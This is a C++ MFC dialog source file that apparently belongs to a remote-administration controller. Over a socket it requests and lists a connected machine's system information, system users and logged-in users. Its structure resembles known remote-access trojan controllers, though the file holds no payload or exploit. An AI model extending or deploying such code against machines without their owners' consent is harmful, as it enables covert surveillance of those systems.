// ServerManagerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ServerManagerDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CServerManagerDlg dialog


CServerManagerDlg::CServerManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CServerManagerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CServerManagerDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

}


void CServerManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CServerManagerDlg)
	DDX_Control(pDX, IDC_TAB, m_tab);
	DDX_Control(pDX, IDC_LIST, m_list);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CServerManagerDlg, CDialog)
	//{{AFX_MSG_MAP(CServerManagerDlg)
	ON_WM_CLOSE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServerManagerDlg message handlers
void CServerManagerDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_SSLIST:
		ShowSysInfoList();
		break;
	case TOKEN_USLIST:
		ShowSysUserList();
		break;
	case TOKEN_ASLIST:
		ShowUserStateList();
		break;
	default:
		return;
	}
}

void CServerManagerDlg::DeleteList()
{
	m_list.DeleteAllItems();	
	int nColumnCount= m_list.GetHeaderCtrl()->GetItemCount();
	
	for(int n=0;n<nColumnCount;n++)
	{
		m_list.DeleteColumn(0);
	}
}



BOOL CServerManagerDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format("\\\\%s - 服务器", IPAddress);
	SetWindowText(str);
	
	m_tab.InsertItem(0, "系统信息");
	m_tab.InsertItem(1, "系统用户");
	m_tab.InsertItem(2, "在线用户");
 
	ShowSysInfoList();

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}


void CServerManagerDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);
	
	CDialog::OnClose();
}

void CServerManagerDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CServerManagerDlg::ShowSelectWindow()
{
	DeleteList();
	switch (m_tab.GetCurSel())
	{
	case 0:
		GetSysInfoList();
		break;
	case 1:
		GetSysUserList();
		break;
	case 2:
		GetUserStateList();
		break;
	default:
		break;
	}
}

void CServerManagerDlg::GetSysUserList()
{
	BYTE bToken = COMMAND_USLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}
void CServerManagerDlg::GetSysInfoList()
{
	BYTE bToken = COMMAND_SSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}
void CServerManagerDlg::GetUserStateList()
{
	BYTE bToken = COMMAND_ASLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CServerManagerDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}
